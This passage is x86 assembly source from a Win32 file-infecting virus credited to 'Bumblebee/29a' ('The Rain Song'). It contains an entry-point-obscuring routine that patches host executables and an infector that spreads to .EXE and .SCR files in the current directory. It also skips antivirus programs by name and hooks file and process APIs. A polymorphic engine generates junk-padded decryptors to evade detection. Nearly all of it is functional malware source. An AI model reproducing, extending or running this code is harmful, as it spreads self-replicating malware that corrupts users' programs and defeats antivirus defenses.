        jmp     searchEPOOut

sectionFound:
        test    dword ptr [esi+24h],10000000h   ; avoid this kind of section
        jnz     searchEPOFail                   ; we can corrupt it!

        push    esi
        sub     edi,dword ptr [esi+0ch]         ; get raw address
        add     edi,dword ptr [esi+14h]
        mov     ecx,dword ptr [esi+10h]
        cmp     ecx,edi
        jna     searchEPOFail
        sub     ecx,edi
        add     edi,dword ptr [mapMem+ebp]
        mov     ebx,edi
        add     ebx,ecx
        sub     ebx,10h                         ; high secure fence
callLoop:                                       ; loop that searches
        cmp     byte ptr [edi],0e8h             ; for the call
        jne     continueCallLoop
        mov     edx,edi
        add     edx,dword ptr [edi+1]
        add     edx,5
        cmp     ebx,edx
        jb      continueCallLoop
        cmp     edx,dword ptr [mapMem+ebp]
        jb      continueCallLoop
        mov     esi,edx
        mov     dx,word ptr [esi]
        cmp     dx,08b55h
        jne     continueCallLoop
        mov     dx,word ptr [esi+1]
        cmp     dx,0ec8bh
        jne     continueCallLoop
        mov     dword ptr [EPOAddr+ebp],edi
        sub     edi,dword ptr [mapMem+ebp]
        pop     esi
        add     edi,dword ptr [esi+0ch]         ; get rva address
        sub     edi,dword ptr [esi+14h]
        mov     dword ptr [EPORva+ebp],edi
        clc
        jmp     searchEPOOut
continueCallLoop:
        inc     edi
        loop    callLoop
searchEPOFail:
        pop     esi
        stc
searchEPOOut:
        popad
        ret
;
; This makes a light EPO. Looks for space in the code section to
; put there a jump to virus code. The header is patched but this
; patch is less notorious. This EPO requires phys size of section
; bigger than virtual size + 5 (the size of the jump).
;
lightEPO:
        pushad
        mov     edi,dword ptr [esi+28h]         ; get host EP

        xor     ecx,ecx
        mov     cx,word ptr [esi+06h]           ; number of sections
        mov     esi,dword ptr [fstSec+ebp]      ; get 1st section addr

lightSectionLoop:                               ; look for code section
        mov     ebx,dword ptr [esi+0ch]
        add     ebx,dword ptr [esi+08h]         ; test it's inside this
        cmp     edi,ebx                         ; section
        jb      lightSectionFound
        add     esi,28h
        dec     ecx
        jnz     lightSectionLoop
lightEPOFail:
        stc
        jmp     lightEPOOut

lightSectionFound:
        test    dword ptr [esi+24h],10000000h   ; avoid this kind of section
        jnz     lightEPOFail                    ; we can corrupt it!

        mov     eax,dword ptr [esi+08h]         ; virtual size
        add     eax,5                           ; plus the code we add
        cmp     eax,dword ptr [esi+10h]         ; bigger than phys size?
        ja      lightEPOFail
        mov     edi,dword ptr [mapMem+ebp]      ; get raw address
        add     edi,dword ptr [esi+08h]
        add     edi,dword ptr [esi+14h]
        mov     dword ptr [esi+08h],eax         ; increase 5 bytes
        mov     dword ptr [EPOAddr+ebp],edi
        sub     edi,dword ptr [mapMem+ebp]
        add     edi,dword ptr [esi+0ch]         ; get rva address
        sub     edi,dword ptr [esi+14h]
        mov     dword ptr [EPORva+ebp],edi
        clc
lightEPOOut:
        popad
        ret
;
; Infects PE files in current directory.
;
infectDir:
        pushad

        lea     esi,find_data+ebp
        push    esi
        lea     esi,fndMask+ebp
        push    esi
        call    dword ptr [_FindFirstFileA+ebp]
        inc     eax
        jz      notFound
        dec     eax

        mov     dword ptr [findHnd+ebp],eax

findNext:
        lea     esi,find_data.cFileName+ebp
        call    stringUp
        lea     esi,stringBuffer+ebp
        push    edi                             ; test the string it's
        sub     edi,esi                         ; long enought
        cmp     edi,5
        pop     edi
        jna     skipThisFile
        cmp     dword ptr [edi-4],'EXE.'
        je      validFileExt
        cmp     dword ptr [edi-4],'RCS.'
        jne     skipThisFile

validFileExt:
        mov     eax,dword ptr [find_data.nFileSizeLow+ebp]
        cmp     eax,4000h
        jb      skipThisFile                    ; at least 4000h bytes?
        mov     ecx,PADDING                     ; test if it's infected
        xor     edx,edx                         ; yet
        div     ecx
        or      edx,edx                         ; reminder is zero?
        jz      skipThisFile

testIfAv:                                       ; let's search for strings
                                                ; that may appear in av progs
        lea     edi,avStrings+ebp
        mov     ecx,vStringsCout
testIfAvL:
        push    esi
        mov     ax,word ptr [edi]
testAvLoop:
        cmp     word ptr [esi],ax
        jne     contTestLoop
        pop     esi
        jmp     skipThisFile
contTestLoop:
        inc     esi
        cmp     byte ptr [esi+3],0              ; skip the ext
        jne     testAvLoop
        pop     esi
        add     edi,2
        loop    testIfAvL

        call    infect

skipThisFile:
        lea     esi,find_data+ebp
        push    esi
        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindNextFileA+ebp]  ; Find next file
        or      eax,eax
        jnz     findNext

        push    dword ptr [findHnd+ebp]
        call    dword ptr [_FindClose+ebp]

notFound:
        popad
        ret

;
; Virus data ---------------------------------------------------------------
;
HOOKTABLEBEGIN  label   byte
                dd      offset _CreateFileA
                dd      offset Hook0
                dd      offset _MoveFileA
                dd      offset Hook1
                dd      offset _CopyFileA
                dd      offset Hook2
                dd      offset _CreateProcessA
                dd      offset Hook3
                dd      offset _SetFileAttributesA
                dd      offset Hook4
                dd      offset _GetFileAttributesA
                dd      offset Hook5
                dd      offset _SearchPathA
                dd      offset Hook6
HOOKTABLEEND    label   byte
EPOAddr         dd      0

copyright       db      '< The Rain Song Coded By Bumblebee/29a >',0dh,0ah

                        ; little tribute
message         db      'ASIMOV Jan.2.1920 - Apr.6.1992',0

FSTAPI                  label   byte
CrcCreateFileA          dd      08c892ddfh
                        db      12
_CreateFileA            dd      0

CrcMapViewOfFile        dd      0797b49ech
                        db      14
_MapViewOfFile          dd      0

CrcCreatFileMappingA    dd      096b2d96ch
                        db      19
_CreateFileMappingA     dd      0

CrcUnmapViewOfFile      dd      094524b42h
                        db      16
_UnmapViewOfFile        dd      0

CrcCloseHandle          dd      068624a9dh
                        db      12
_CloseHandle            dd      0

CrcFindFirstFileA       dd      0ae17ebefh
                        db      15
_FindFirstFileA         dd      0

CrcFindNextFileA        dd      0aa700106h
                        db      14
_FindNextFileA          dd      0

CrcFindClose            dd      0c200be21h
                        db      10
_FindClose              dd      0

CrcVirtualAlloc         dd      04402890eh
                        db      13
_VirtualAlloc           dd      0

CrcGetTickCount         dd      0613fd7bah
                        db      13
_GetTickCount           dd      0

CrcGetFileTime          dd      04434e8feh
                        db      12
_GetFileTime            dd      0

CrcSetFileTime          dd      04b2a3e7dh
                        db      12
_SetFileTime            dd      0

CrcSetFileAttributesA   dd      03c19e536h
                        db      19
_SetFileAttributesA     dd      0

CrcGetFileAttributesA   dd      0c633d3deh
                        db      19
_GetFileAttributesA     dd      0

CrcGetFileSize          dd      0ef7d811bh
                        db      12
_GetFileSize            dd      0

CrcGetSystemTime        dd      075b7ebe8h
                        db      14
_GetSystemTime          dd      0

CrcFatalAppExitA        dd      0253ab1b9h
                        db      14
_FatalAppExitA          dd      0

CrcMoveFileA            dd      02308923fh
                        db      10
_MoveFileA              dd      0

CrcCopyFileA            dd      05bd05db1h
                        db      10
_CopyFileA              dd      0

CrcCreateProcessA       dd      0267e0b05h
                        db      15
_CreateProcessA         dd      0

CrcSearchPathA          dd      0f4d9d033h
                        db      12
_SearchPathA            dd      0

CrcGetCurrentDirectoryA dd      0ebc6c18bh
                        db      21
_GetCurrentDirectoryA   dd      0

CrcSetCurrentDirectoryA dd      0b2dbd7dch
                        db      21 
_SetCurrentDirectoryA   dd      0

CrcGetWindowsDirectoryA dd      0fe248274h
                        db      21 
_GetWindowsDirectoryA   dd      0
ENDAPI                  label   byte

; AV: AVP, PAV, NAV, ...
; AN: SCAN, VISUSSCAN, ...
; DR: DRWEB
; ID: SPIDER
; OD: NOD-ICE
; TB: THUNDERBYTE... (this still exists?)
; F-: F-PROT, ...
avStrings       dw      'VA','NA','RD','DI','DO','BT','-F'
vStringsCout    equ     (offset $-offset avStrings)/2
fndMask                 db      '*.*',0
;
; Virus data ends here -----------------------------------------------------
;

;
;  Polymorphic Engine (V2LPE - Very^2 Lame Polymorphic Engine)
;
;  This is a simple polymorphic engine. Uses some piezes of code from
;  AOCPE. Very, very lame :( But does its work as poly engine. May be
;  its size the only one point for.
;
;  EAX: CrptKey
;  ECX: CodeSize (code to decrypt prepared yet)
;  EDI: Destination address
;
; returns EAX: size of generated proc
;
GenDCrpt:
        pushad                                  ; setup regs status
        xor     eax,eax
        lea     edi,RegStatus+ebp
        mov     ecx,8
        rep     stosb
        popad
        mov     byte ptr [RegStatus+ebp+_EBP],1
        mov     byte ptr [RegStatus+ebp+_ESP],1
        mov     dword ptr [CrptKey+ebp],eax
        mov     dword ptr [CodeSize+ebp],ecx

        push    edi

        xor     eax,eax
        call    GetReg
        mov     byte ptr [KeyReg+ebp],al

        call    AddShit

        mov     cl,_EBP
        call    AddPushREG

        call    AddShit

        mov     ax,0ec8bh
        stosw

        call    AddShit

        mov     edx,04h
        mov     cl,_EBP
        call    AddMovREGMEMEBP

        call    AddShit

        mov     cl,byte ptr [KeyReg+ebp]
        call    AddPushREG

        call    AddShit

        mov     cl,byte ptr [KeyReg+ebp]
        mov     edx,dword ptr [CrptKey+ebp]
        call    AddMovREGINM

        call    AddShit

        call    GetReg
        mov     byte ptr [LoopReg+ebp],al

        mov     cl,al
        call    AddPushREG

        call    AddShit

        mov     cl,byte ptr [LoopReg+ebp]
        mov     edx,dword ptr [CodeSize+ebp]
        call    AddMovREGINM

        call    AddShit

        push    edi

        mov     cl,byte ptr [KeyReg+ebp]
        call    AddXorMEMEBPREG

        call    AddShit

        mov     cl,_EBP
        mov     edx,04h
        call    AddAddREGINM

        call    AddShit

        mov     cl,byte ptr [LoopReg+ebp]
        mov     edx,1
        call    AddSubREGINM

        pop     ebx
        mov     eax,edi
        sub     eax,ebx
        push    eax
        mov     al,75h
        stosb
        pop     eax
        mov     ah,0feh
        xchg    al,ah
        sub     al,ah
        stosb

        call    AddShit

        mov     cl,byte ptr [LoopReg+ebp]
        call    AddPopREG

        call    AddShit

        mov     al,byte ptr [LoopReg+ebp]
        call    FreeReg

        mov     cl,byte ptr [KeyReg+ebp]
        call    AddPopREG

        call    AddShit

        mov     cl,_EBP
        call    AddPopREG

        call    AddShit

        mov     al,0c3h
        stosb

        pop     esi
        sub     edi,esi
        mov     eax,edi
        ret

;
; Poly engine data
;
_EAX    equ     0
_ECX    equ     1
_EDX    equ     2
_EBX    equ     3
_ESP    equ     4
_EBP    equ     5
_ESI    equ     6
_EDI    equ     7
RegStatus       db      8 dup(0)
KeyReg          db      0
LoopReg         db      0
CrptKey         dd      0
CodeSize        dd      0
Rnd             db      ?

;
; returns AL: selected register
;
GetReg:
        xor     eax,eax
        mov     al,byte ptr [CrptKey+ebp]
GetReg1:
        and     al,7
        lea     ecx,RegStatus+ebp
        add     ecx,eax
        mov     dl,byte ptr [ecx]
        or      dl,dl
        jz      GetReg0
        inc     al
        jmp     GetReg1
GetReg0:
        mov     byte ptr [ecx],1
        ret

;
;  AL: selected register to free
;
FreeReg:
        and     eax,7
        lea     ecx,RegStatus+ebp
        add     ecx,eax
        mov     byte ptr [ecx],0
        ret

;
;  Instruction generators
;
;  EDI: Destination code
;  ECX: Reg (if applicable)
;  EDX: Inm (if applicable)
;

AddPushREG:
        mov     al,050h
        add     al,cl
        stosb
        ret

AddPopREG:
        mov     al,058h
        add     al,cl
        stosb
        ret
        
AddMovREGINM:
        mov     al,0b8h
        add     al,cl
        stosb
        mov     eax,edx
        stosd
        ret

AddMovREGMEMEBP:
        mov     al,08bh
        stosb
        mov     al,08h
        mul     cl
        add     al,85h
        stosb
        mov     eax,edx
        stosd
        ret

AddXorMEMEBPREG:
        mov     al,031h
        stosb
        mov     al,08h
        mul     cl
        add     al,45h
        stosb
        xor     al,al
        stosb
        ret

AddAddREGINM:
        or      cl,cl
        jnz     AddAddREGINM0
        mov     al,05h
        stosb
        jmp     AddAddREGINM1
AddAddREGINM0:
        mov     al,081h
        stosb
        mov     al,0c0h
        add     al,cl
        stosb
AddAddREGINM1:
        mov     eax,edx
        stosd
        ret

AddSubREGINM:
        or      cl,cl
        jnz     AddSubREGINM0
        mov     al,2dh
        stosb
        jmp     AddSubREGINM1
AddSubREGINM0:
        mov     al,081h
        stosb
        mov     al,0e8h
        add     al,cl
        stosb
AddSubREGINM1:
        mov     eax,edx
        stosd
        ret
;
; Yet another lame shit generator by Bumblebee ;)
;
AddShit:
        mov     eax,dword ptr [CrptKey+ebp]
        add     byte ptr [Rnd+ebp],al
        and     al,1
        jz      AddShit2

        xor     eax,eax
        mov     al,byte ptr [Rnd+ebp]
        lea     edx,shit0+ebp
        and     al,7
        mov     cl,2
        mul     cl
        add     edx,eax
        mov     ax,word ptr [edx]
        stosw

        mov     al,byte ptr [Rnd+ebp]
        and     al,2
        jz      AddShit2

        lea     edx,shit1+ebp
        mov     al,byte ptr [Rnd+ebp]
        and     al,3
        mov     cl,2
        mul     cl
        add     edx,eax
        mov     ax,word ptr [edx]
        stosw
        stosw
        ret

AddShit2:
        xor     eax,eax
        mov     al,byte ptr [Rnd+ebp]
        lea     edx,shit0+ebp
        and     al,7
        mov     cl,2
        mul     cl
        add     edx,eax
        mov     ax,word ptr [edx]
        stosw

        lea     edx,shit0+ebp
        add     edx,2
        mov     al,byte ptr [Rnd+ebp]
        and     al,3
        mov     cl,2
        mul     cl
        add     edx,eax
        mov     ax,word ptr [edx]
        stosw

        ret
; some do-nothing opcodes
shit0:  dw      9090h,0db87h,0c987h,0d287h,4840h,434bh,4941h,4a42h
shit1:  dw      0d0f7h,0d3f7h,0d1f7h,0d2f7h

crptSecondEND label byte
; Decryptor for the second layer.
secondLayerDecrypt:
        push    ebp
        mov     ebp,esp
        push    ecx
        mov     ebp,dword ptr [ebp+4]
        mov     ecx,crptSecondEND-crptSecondINI
secondLayerLoop:
        not     byte ptr [ebp]
        inc     ebp
        loop    secondLayerLoop
        pop     ecx ebp
        ret

crptEND label byte
vEnd    label byte

; This is a fake decryptor for the 1st generation. Allows the virus to
; skip the second layer decryptor.
crypt:
        pop     edx
        lea     edx,crptSecondINI
        push    edx
        ret
;
; Temp data. Not stored into the file, only 1st generation.
;
BUFFERBEGIN     label   byte
stringBuffer    db      STRINGTOP dup(0)
tmpPath         db      STRINGTOP dup(0)
address         dd      0
names           dd      0 
ordinals        dd      0
nexports        dd      0
expcount        dd      0
memHnd          dd      0

fHnd            dd      0
fhmap           dd      0
mapMem          dd      0

fileSize        dd      0
fileAttrib      dd      0
fileTime0       dd      0,0
fileTime1       dd      0,0
fileTime2       dd      0,0
pad             dd      0
fNameAddr       dd      0
gensize         dd      0
virtsize        dd      0
myRVA           dd      0
fstSec          dd      0
find_data       WIN32_FIND_DATA <0>
findHnd         dd      0
semHook         db      0
EPORva          dd      0
BUFFEREND       label   byte
BUFFERSIZE      equ     BUFFEREND-BUFFERBEGIN

;
; For 1st generation only.
;
fakeHost:
        push    0h
        call    ExitProcess
Ends
End     inicio
